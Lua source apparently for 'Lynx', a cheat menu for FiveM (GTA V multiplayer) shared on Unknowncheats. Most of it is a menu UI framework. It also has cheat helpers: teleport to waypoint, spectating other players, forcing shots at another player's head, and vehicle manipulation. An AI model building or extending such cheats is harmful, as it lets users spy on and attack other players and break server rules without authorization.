-- By NiT34ByTe and DJSNAKE2 
-- Based on Ruby's Source Code
-- for Unknowncheats
 
lynxunknowncheats = {}
 
lynxunknowncheats.debug = false
 
local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000
 
	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)
 
	return result
end
 
local menus = {}
local keys = {up = 172, down = 173, left = 174, right = 175, select = 176, back = 177}
local optionCount = 0
 
local currentKey = nil
local currentMenu = nil
 
local menuWidth = 0.23
local titleHeight = 0.11
local titleYOffset = 0.03
local titleScale = 1.0
 
local buttonHeight = 0.038
local buttonFont = 0
local buttonScale = 0.365
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005
 
local function debugPrint(text)
	if lynxunknowncheats.debug then
		Citizen.Trace("[lynxunknowncheats] " .. tostring(text))
	end
end
 
local function setMenuProperty(id, property, value)
	if id and menus[id] then
		menus[id][property] = value
		debugPrint(id .. " menu property changed: { " .. tostring(property) .. ", " .. tostring(value) .. " }")
	end
end
 
local function isMenuVisible(id)
	if id and menus[id] then
		return menus[id].visible
	else
		return false
	end
end
 
local function setMenuVisible(id, visible, holdCurrent)
	if id and menus[id] then
		setMenuProperty(id, "visible", visible)
 
		if not holdCurrent and menus[id] then
			setMenuProperty(id, "currentOption", 1)
		end
 
		if visible then
			if id ~= currentMenu and isMenuVisible(currentMenu) then
				setMenuVisible(currentMenu, false)
			end
 
			currentMenu = id
		end
	end
end
 
local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale, scale)
 
	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end
 
	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - buttonTextXOffset)
			SetTextRightJustify(true)
		end
	end
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x, y)
end
 
local function drawRect(x, y, width, height, color)
	DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end
 
local function drawTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight / 2
 
		if menus[currentMenu].titleBackgroundSprite then
			DrawSprite(
				menus[currentMenu].titleBackgroundSprite.dict,
				menus[currentMenu].titleBackgroundSprite.name,
				x,
				y,
				menuWidth,
				titleHeight,
				0.,
				255,
				255,
				255,
				255
			)
		else
			drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
		end
 
		drawText(
			menus[currentMenu].title,
			x,
			y - titleHeight / 2 + titleYOffset,
			menus[currentMenu].titleFont,
			menus[currentMenu].titleColor,
			titleScale,
			true
		)
	end
end
 
local function drawSubTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight + buttonHeight / 2
 
		local subTitleColor = {
			r = menus[currentMenu].titleBackgroundColor.r,
			g = menus[currentMenu].titleBackgroundColor.g,
			b = menus[currentMenu].titleBackgroundColor.b,
			a = 255
		}
 
		drawRect(x, y, menuWidth, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
		drawText(
			menus[currentMenu].subTitle,
			menus[currentMenu].x + buttonTextXOffset,
			y - buttonHeight / 2 + buttonTextYOffset,
			buttonFont,
			subTitleColor,
			buttonScale,
			false
		)
 
		if optionCount > menus[currentMenu].maxOptionCount then
			drawText(
				tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
				menus[currentMenu].x + menuWidth,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTitleColor,
				buttonScale,
				false,
				false,
				true
			)
		end
	end
end
 
local function drawButton(text, subText)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil
 
	if
		menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].maxOptionCount
	 then
		multiplier = optionCount
	elseif
		optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].currentOption
	 then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end
 
	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false
 
		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			shadow = true
		end
 
		drawRect(x, y, menuWidth, buttonHeight, backgroundColor)
		drawText(
			text,
			menus[currentMenu].x + buttonTextXOffset,
			y - (buttonHeight / 2) + buttonTextYOffset,
			buttonFont,
			textColor,
			buttonScale,
			false,
			shadow
		)
 
		if subText then
			drawText(
				subText,
				menus[currentMenu].x + buttonTextXOffset,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTextColor,
				buttonScale,
				false,
				shadow,
				true
			)
		end
	end
end
 
function lynxunknowncheats.CreateMenu(id, title)
	-- Default settings
	menus[id] = {}
	menus[id].title = title
	menus[id].subTitle = "INTERACTION MENU"
 
	menus[id].visible = false
 
	menus[id].previousMenu = nil
 
	menus[id].aboutToBeClosed = false
 
	menus[id].x = 0.75
	menus[id].y = 0.19
 
	menus[id].currentOption = 1
	menus[id].maxOptionCount = 10
	menus[id].titleFont = 1
	menus[id].titleColor = {r = 255, g = 255, b = 255, a = 255}
	Citizen.CreateThread(
		function()
			while true do
				Citizen.Wait(0)
				local ra = RGBRainbow(1.0)-- RGB MENU DISABLED // NiT34ByTe
				menus[id].titleBackgroundColor = {r = ra.r, g = ra.g, b = ra.b, a = 255} --RGB MENU DISABLED // NiT34ByTe - Culoare titlu
				menus[id].menuFocusBackgroundColor = {r = ra.r, g = ra.g, b = ra.b, a = 100} --RGB MENU DISABLED // NiT34ByTe - Culoare meniu
				--menus[id].titleBackgroundColor = {r = 5, g = 173, b = 5, a = 255}
				--menus[id].menuFocusBackgroundColor = {r = 25, g = 255, b = 248, a = 25}
			end
		end)
	menus[id].titleBackgroundSprite = nil
 
	menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].menuSubTextColor = {r = 189, g = 189, b = 189, a = 255}
	menus[id].menuFocusTextColor = {r = 255, g = 255, b = 255, a = 255}
	--menus[id].menuFocusBackgroundColor = { r = 245, g = 245, b = 245, a = 255 }
	menus[id].menuBackgroundColor = {r = 0, g = 0, b = 0, a = 100}
 
	menus[id].subTitleBackgroundColor = {
		r = menus[id].menuBackgroundColor.r,
		g = menus[id].menuBackgroundColor.g,
		b = menus[id].menuBackgroundColor.b,
		a = 255
	}
 
	menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"} --https://pastebin.com/0neZdsZ5
 
	debugPrint(tostring(id) .. " menu created")
end
 
function lynxunknowncheats.CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		lynxunknowncheats.CreateMenu(id, menus[parent].title)
 
		if subTitle then
			setMenuProperty(id, "subTitle", string.upper(subTitle))
		else
			setMenuProperty(id, "subTitle", string.upper(menus[parent].subTitle))
		end
 
		setMenuProperty(id, "previousMenu", parent)
 
		setMenuProperty(id, "x", menus[parent].x)
		setMenuProperty(id, "y", menus[parent].y)
		setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
		setMenuProperty(id, "titleFont", menus[parent].titleFont)
		setMenuProperty(id, "titleColor", menus[parent].titleColor)
		setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
		setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
		setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
		setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
		setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
		setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
		setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
		setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
	else
		debugPrint("Failed to create " .. tostring(id) .. " submenu: " .. tostring(parent) .. " parent menu doesn't exist")
	end
end
 
function lynxunknowncheats.CurrentMenu()
	return currentMenu
end
 
function lynxunknowncheats.OpenMenu(id)
	if id and menus[id] then
		PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
		setMenuVisible(id, true)
 
		if menus[id].titleBackgroundSprite then
			RequestStreamedTextureDict(menus[id].titleBackgroundSprite.dict, false)
			while not HasStreamedTextureDictLoaded(menus[id].titleBackgroundSprite.dict) do
				Citizen.Wait(0)
			end
		end
 
		debugPrint(tostring(id) .. " menu opened")
	else
		debugPrint("Failed to open " .. tostring(id) .. " menu: it doesn't exist")
	end
end
 
function lynxunknowncheats.IsMenuOpened(id)
	return isMenuVisible(id)
end
 
function lynxunknowncheats.IsAnyMenuOpened()
	for id, _ in pairs(menus) do
		if isMenuVisible(id) then
			return true
		end
	end
 
	return false
end
 
function lynxunknowncheats.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
		return menus[currentMenu].aboutToBeClosed
	else
		return false
	end
end
 
function lynxunknowncheats.CloseMenu()
	if menus[currentMenu] then
		if menus[currentMenu].aboutToBeClosed then
			menus[currentMenu].aboutToBeClosed = false
			setMenuVisible(currentMenu, false)
			debugPrint(tostring(currentMenu) .. " menu closed")
			PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			optionCount = 0
			currentMenu = nil
			currentKey = nil
		else
			menus[currentMenu].aboutToBeClosed = true
			debugPrint(tostring(currentMenu) .. " menu about to be closed")
		end
	end
end
 
function lynxunknowncheats.Button(text, subText)
	local buttonText = text
	if subText then
		buttonText = "{ " .. tostring(buttonText) .. ", " .. tostring(subText) .. " }"
	end
 
	if menus[currentMenu] then
		optionCount = optionCount + 1
 
		local isCurrent = menus[currentMenu].currentOption == optionCount
 
		drawButton(text, subText)
 
		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText .. " button pressed")
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end
 
		return false
	else
		debugPrint("Failed to create " .. buttonText .. " button: " .. tostring(currentMenu) .. " menu doesn't exist")
 
		return false
	end
end
 
function lynxunknowncheats.MenuButton(text, id)
	if menus[id] then
		if lynxunknowncheats.Button(text) then
			setMenuVisible(currentMenu, false)
			setMenuVisible(id, true, true)
 
			return true
		end
	else
		debugPrint("Failed to create " .. tostring(text) .. " menu button: " .. tostring(id) .. " submenu doesn't exist")
	end
 
	return false
end
 
function lynxunknowncheats.CheckBox(text, bool, callback)
	local checked = "~r~~h~Off"
	if bool then
		checked = "~g~~h~On"
	end
 
	if lynxunknowncheats.Button(text, checked) then
		bool = not bool
		debugPrint(tostring(text) .. " checkbox changed to " .. tostring(bool))
		callback(bool)
 
		return true
	end
 
	return false
end
 
function lynxunknowncheats.ComboBox(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)
 
	if itemsCount > 1 and isCurrent then
		selectedItem = "← " .. tostring(selectedItem) .. " →"
	end
 
	if lynxunknowncheats.Button(text, selectedItem) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
			if currentIndex > 1 then
				currentIndex = currentIndex - 1
			else
				currentIndex = itemsCount
			end
		elseif currentKey == keys.right then
			if currentIndex < itemsCount then
				currentIndex = currentIndex + 1
			else
				currentIndex = 1
			end
		end
	else
		currentIndex = selectedIndex
	end
 
	callback(currentIndex, selectedIndex)
	return false
end
 
function lynxunknowncheats.Display()
	if isMenuVisible(currentMenu) then
		if menus[currentMenu].aboutToBeClosed then
			lynxunknowncheats.CloseMenu()
		else
			ClearAllHelpMessages()
 
			drawTitle()
			drawSubTitle()
 
			currentKey = nil
 
			if IsDisabledControlJustPressed(0, keys.down) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
 
				if menus[currentMenu].currentOption < optionCount then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
				else
					menus[currentMenu].currentOption = 1
				end
			elseif IsDisabledControlJustPressed(0, keys.up) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
 
				if menus[currentMenu].currentOption > 1 then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
				else
					menus[currentMenu].currentOption = optionCount
				end
			elseif IsDisabledControlJustPressed(0, keys.left) then
				currentKey = keys.left
			elseif IsDisabledControlJustPressed(0, keys.right) then
				currentKey = keys.right
			elseif IsDisabledControlJustPressed(0, keys.select) then
				currentKey = keys.select
			elseif IsDisabledControlJustPressed(0, keys.back) then
				if menus[menus[currentMenu].previousMenu] then
					PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					setMenuVisible(menus[currentMenu].previousMenu, true)
				else
					lynxunknowncheats.CloseMenu()
				end
			end
 
			optionCount = 0
		end
	end
end
 
function lynxunknowncheats.SetMenuWidth(id, width)
	setMenuProperty(id, "width", width)
end
 
function lynxunknowncheats.SetMenuX(id, x)
	setMenuProperty(id, "x", x)
end
 
function lynxunknowncheats.SetMenuY(id, y)
	setMenuProperty(id, "y", y)
end
 
function lynxunknowncheats.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, "maxOptionCount", count)
end
 
function lynxunknowncheats.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
end
 
function lynxunknowncheats.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"titleBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
	)
end
 
function lynxunknowncheats.SetTitleBackgroundSprite(id, textureDict, textureName)
	setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end
 
function lynxunknowncheats.SetSubTitle(id, text)
	setMenuProperty(id, "subTitle", string.upper(text))
end
 
function lynxunknowncheats.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"menuBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
	)
end
 
function lynxunknowncheats.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
end
 
function lynxunknowncheats.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
end
 
function lynxunknowncheats.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
end
 
function lynxunknowncheats.SetMenuButtonPressedSound(id, name, set)
	setMenuProperty(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
end
 
function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
	AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
	DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
	blockinput = true
 
	while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
		Citizen.Wait(0)
	end
 
	if UpdateOnscreenKeyboard() ~= 2 then
		local result = GetOnscreenKeyboardResult()
		Citizen.Wait(500)
		blockinput = false
		return result
	else
		Citizen.Wait(500)
		blockinput = false
		return nil
	end
end
 
local function getPlayerIds()
	local players = {}
	for i = 0, GetNumberOfPlayers() do
		if NetworkIsPlayerActive(i) then
			players[#players + 1] = i
		end
	end
	return players
end
 
 
function DrawText3D(x, y, z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	DrawText(0.0, 0.0)
	ClearDrawOrigin()
end
 
function math.round(num, numDecimalPlaces)
	return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end
 
local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000
 
	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)
 
	return result
end
 
function drawNotification(text)
	SetNotificationTextEntry("STRING")
	AddTextComponentString(text)
	DrawNotification(false, false)
end
 
local allWeapons = {
	"WEAPON_KNIFE",
	"WEAPON_KNUCKLE",
	"WEAPON_NIGHTSTICK",
	"WEAPON_HAMMER",
	"WEAPON_BAT",
	"WEAPON_GOLFCLUB",
	"WEAPON_CROWBAR",
	"WEAPON_BOTTLE",
	"WEAPON_DAGGER",
	"WEAPON_HATCHET",
	"WEAPON_MACHETE",
	"WEAPON_FLASHLIGHT",
	"WEAPON_SWITCHBLADE",
	"WEAPON_PISTOL",
	"WEAPON_PISTOL_MK2",
	"WEAPON_COMBATPISTOL",
	"WEAPON_APPISTOL",
	"WEAPON_PISTOL50",
	"WEAPON_SNSPISTOL",
	"WEAPON_HEAVYPISTOL",
	"WEAPON_VINTAGEPISTOL",
	"WEAPON_STUNGUN",
	"WEAPON_FLAREGUN",
	"WEAPON_MARKSMANPISTOL",
	"WEAPON_REVOLVER",
	"WEAPON_MICROSMG",
	"WEAPON_SMG",
	"WEAPON_SMG_MK2",
	"WEAPON_ASSAULTSMG",
	"WEAPON_MG",
	"WEAPON_COMBATMG",
	"WEAPON_COMBATMG_MK2",
	"WEAPON_COMBATPDW",
	"WEAPON_GUSENBERG",
	"WEAPON_MACHINEPISTOL",
	"WEAPON_ASSAULTRIFLE",
	"WEAPON_ASSAULTRIFLE_MK2",
	"WEAPON_CARBINERIFLE",
	"WEAPON_CARBINERIFLE_MK2",
	"WEAPON_ADVANCEDRIFLE",
	"WEAPON_SPECIALCARBINE",
	"WEAPON_BULLPUPRIFLE",
	"WEAPON_COMPACTRIFLE",
	"WEAPON_PUMPSHOTGUN",
	"WEAPON_SAWNOFFSHOTGUN",
	"WEAPON_BULLPUPSHOTGUN",
	"WEAPON_ASSAULTSHOTGUN",
	"WEAPON_MUSKET",
	"WEAPON_HEAVYSHOTGUN",
	"WEAPON_DBSHOTGUN",
	"WEAPON_SNIPERRIFLE",
	"WEAPON_HEAVYSNIPER",
	"WEAPON_HEAVYSNIPER_MK2",
	"WEAPON_MARKSMANRIFLE",
	"WEAPON_GRENADELAUNCHER",
	"WEAPON_GRENADELAUNCHER_SMOKE",
	"WEAPON_RPG",
	"WEAPON_STINGER",
	"WEAPON_FIREWORK",
	"WEAPON_HOMINGLAUNCHER",
	"WEAPON_GRENADE",
	"WEAPON_STICKYBOMB",
	"WEAPON_PROXMINE",
	"WEAPON_BZGAS",
	"WEAPON_SMOKEGRENADE",
	"WEAPON_MOLOTOV",
	"WEAPON_FIREEXTINGUISHER",
	"WEAPON_PETROLCAN",
	"WEAPON_SNOWBALL",
	"WEAPON_FLARE",
	"WEAPON_BALL"
}
 
local Enabled = true
 
local function TeleportToWaypoint()
	if DoesBlipExist(GetFirstBlipInfoId(8)) then
		local blipIterator = GetBlipInfoIdIterator(8)
		local blip = GetFirstBlipInfoId(8, blipIterator)
		WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) --Thanks To Briglair [forum.FiveM.net]
		wp = true
	else
		drawNotification("~r~No waypoint!")
	end
 
	local zHeigt = 0.0
	height = 1000.0
	while true do
		Citizen.Wait(0)
		if wp then
			if
				IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
					(GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
			 then
				entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
			else
				entity = GetPlayerPed(-1)
			end
 
			SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
			FreezeEntityPosition(entity, true)
			local Pos = GetEntityCoords(entity, true)
 
			if zHeigt == 0.0 then
				height = height - 25.0
				SetEntityCoords(entity, Pos.x, Pos.y, height)
				bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
			else
				SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
				FreezeEntityPosition(entity, false)
				wp = false
				height = 1000.0
				zHeigt = 0.0
				drawNotification("~g~Teleported to waypoint!")
				break
			end
		end
	end
end
 
function stringsplit(inputstr, sep)
	if sep == nil then
		sep = "%s"
	end
	local t = {}
	i = 1
	for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
		t[i] = str
		i = i + 1
	end
	return t
end
 
local Spectating = false
 
function SpectatePlayer(player)
	local playerPed = PlayerPedId()
	Spectating = not Spectating
	local targetPed = GetPlayerPed(player)
 
	if (Spectating) then
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))
 
		RequestCollisionAtCoord(targetx, targety, targetz)
		NetworkSetInSpectatorMode(true, targetPed)
 
		drawNotification("Spectating " .. GetPlayerName(player))
	else
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))
 
		RequestCollisionAtCoord(targetx, targety, targetz)
		NetworkSetInSpectatorMode(false, targetPed)
 
		drawNotification("Stopped Spectating " .. GetPlayerName(player))
	end
end
 
function ShootPlayer(player)
	local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
	SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
end
 
function MaxOut(veh)
                    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
                    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
                    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end
 
function DelVeh(veh)
	SetEntityAsMissionEntity(Object, 1, 1)
	DeleteEntity(Object)
	SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
	DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
end
 
function Clean(veh)
	SetVehicleDirtLevel(veh, 15.0)
end
 
function Clean2(veh)
	SetVehicleDirtLevel(veh, 1.0)
end
 
 
entityEnumerator = {
	__gc = function(enum)
	  if enum.destructor and enum.handle then
		enum.destructor(enum.handle)
	  end
	  enum.destructor = nil
	  enum.handle = nil
	end
  }
 
function EnumerateEntities(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
	  local iter, id = initFunc()
	  if not id or id == 0 then
		disposeFunc(iter)
		return
	  end
	  
	  local enum = {handle = iter, destructor = disposeFunc}
	  setmetatable(enum, entityEnumerator)
	  
	  local next = true
	  repeat
		coroutine.yield(id)
		next, id = moveFunc(iter)
	  until not next
	  
	  enum.destructor, enum.handle = nil, nil
	  disposeFunc(iter)
	end)
  end
 
  function EnumerateObjects()
	return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
  end
 
  function EnumeratePeds()
	return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
  end
 
